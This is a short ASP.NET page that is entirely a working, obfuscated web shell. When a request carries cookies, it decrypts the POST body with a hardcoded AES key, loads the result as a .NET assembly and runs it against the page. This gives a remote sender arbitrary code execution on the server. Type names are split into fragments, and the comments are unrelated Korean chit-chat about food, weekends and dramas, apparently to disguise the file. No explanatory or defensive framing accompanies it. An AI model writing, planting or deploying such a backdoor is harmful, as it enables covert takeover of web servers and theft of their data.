<%@ Page Language="C#" %>
<%
    // 배고파요, 치킨 먹고 싶다
    Func<string[], string> g = (a) => String.Concat(a);

    // 주말에 뭐 할 거예요?
    Action<Page> r = (p) => {
        // 이 영화 정말 재미있어요.
        string[] d = new string[] { "ca6345", "7538b9", "b1e0" };
        string[] e = new string[] { "K" };
        string[] f = new string[] { "System.Security", ".Cryptography.", "RijndaelManaged" };
        
        byte[] k = System.Text.Encoding.Default.GetBytes(g(d));
        
        var s = p.Request.InputStream;
        byte[] c = new byte[s.Length];
        s.Read(c, 0, c.Length);
        
        // 한국 드라마를 좋아해요.
        var t = System.Type.GetType(g(f));
        var m = System.Activator.CreateInstance(t);
        
        var cr = (System.Security.Cryptography.ICryptoTransform)m.GetType().GetMethod("CreateDecryptor", new System.Type[]{typeof(byte[]), typeof(byte[])}).Invoke(m, new object[]{k, k});
        byte[] b = cr.TransformFinalBlock(c, 0, c.Length);
        
        var asm = System.Reflection.Assembly.Load(b);
        var i = asm.CreateInstance(g(e));
        
        i.Equals(p);
    };

    // 날씨가 좋네요.
    if(Request.Cookies.Count != 0)
    {
        r(this);
    }
%>